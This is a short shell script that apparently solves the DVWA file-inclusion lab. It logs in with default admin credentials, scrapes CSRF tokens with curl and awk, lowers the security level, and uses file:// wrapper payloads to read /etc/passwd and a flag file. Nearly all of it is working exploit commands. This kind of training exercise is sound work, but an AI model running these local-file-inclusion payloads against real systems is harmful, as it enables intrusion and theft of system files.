#Login with the known details
CSRF=$(curl -s -c dvwa.cookie 192.168.178.98/dvwa/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
curl -s -i -L -b dvwa.cookie -d $"username=admin&password=password&Login=Login&user_token=${CSRF}" 192.168.178.98/dvwa/login.php > /dev/null
#Change the security level to medium (impossible by default)
CSRFSEC=$(curl -s -i -L -c dvwa.cookie.medium -b dvwa.cookie 192.168.178.98/dvwa/security.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONIDSEC=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
curl -s -i -L -b dvwa.cookie.medium -c dvwa.cookie.medium -d $"security=medium&seclev_submit=Submit&user_token=${CSRFSEC}" 192.168.178.98/dvwa/security.php > /dev/null
#Check out the "File injection" page
curl -s -i -L -b dvwa.cookie.medium 192.168.178.98/dvwa/vulnerabilities/fi/ > /dev/null
#have to use relative paths and https://secure.php.net/manual/en/wrappers.php, http(s):// gets scrubbed
curl -s -L -b dvwa.cookie.medium 192.168.178.98/dvwa/vulnerabilities/fi/?page=$(../rawurlencode.sh "file:///etc/passwd") > passwd
curl -s -L -b dvwa.cookie.medium 192.168.178.98/dvwa/vulnerabilities/fi/?page=$(../rawurlencode.sh "file:///var/www/html/dvwa/hackable/flags/fi.php") > hackable
rm -f dvwa*
